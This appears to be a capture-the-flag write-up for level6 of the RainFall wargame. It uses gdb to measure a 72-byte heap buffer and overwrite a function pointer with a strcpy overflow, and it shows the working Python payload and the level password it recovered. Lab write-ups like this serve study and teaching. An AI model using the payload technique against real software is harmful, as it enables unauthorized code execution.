scp -P 4242 level6@192.168.56.103:/home/user/level6/level6 /home/zouz/Desktop/level6

the program expects a command line input and we can see an n() function not called anywhere which prints the flag we need. We'll use the strcpy overflow to print n()


1. Find out the buffer’s address

```
0x08048485      mov dword [esp], 0x40 ; '@' ; 64 ; size_t size
0x0804848c      call malloc        ; sym.imp.malloc ;  void *malloc(size_t size)
0x08048491      mov dword [dest], eax
```

%eax should contain our argv[1]’s address. Check that out by inserting a breakpoint after this instruction.

```
(gdb)  r AAAA
Starting program: /home/user/level6/level6 AAAA

Breakpoint 1, 0x08048491 in main ()
(gdb) i r
eax            0x804a008	134520840
(gdb) c
Continuing.

Breakpoint 2, 0x080484c5 in main ()
(gdb) i r
eax            0x804a008	134520840
ecx            0x20fa9	135081
edx            0xbffff903	-1073743613
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff700	0xbffff700
ebp            0xbffff728	0xbffff728
esi            0x0	0
edi            0x0	0
eip            0x80484c5	0x80484c5 <main+73>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) c
Continuing.

Breakpoint 3, 0x08048468 in m ()
(gdb) x /128bx 0x804a008
0x804a008:	0x41	0x41	0x41	0x41	0x00	0x00	0x00	0x00
0x804a010:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a018:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a020:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a030:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a038:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a040:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a048:	0x00	0x00	0x00	0x00	0x11	0x00	0x00	0x00
0x804a050:	0x68	0x84	0x04	0x08	0x00	0x00	0x00	0x00
0x804a058:	0x00	0x00	0x00	0x00	0xa9	0x0f	0x02	0x00
0x804a060:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a068:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a070:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a078:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x804a080:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```
we can see that at 0x804a050 there is the address of m() so end of our buffer is at 0x804a048.
Hex value: 804a050 – 804a008 = 48
Decimal value: 134520912 – 134520840 = 72
The buffer size is 72.

2. Find out the variable’s address.

```
(gdb) x n
0x8048454 <n>:	0x55
```

3. Exploit !

```
(gdb) r $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
Starting program: /home/user/level6/level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
/bin/cat: /home/user/level7/.pass: Permission denied
[Inferior 1 (process 8282) exited normally]
```

in the terminal: 

level6@RainFall:~$ ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
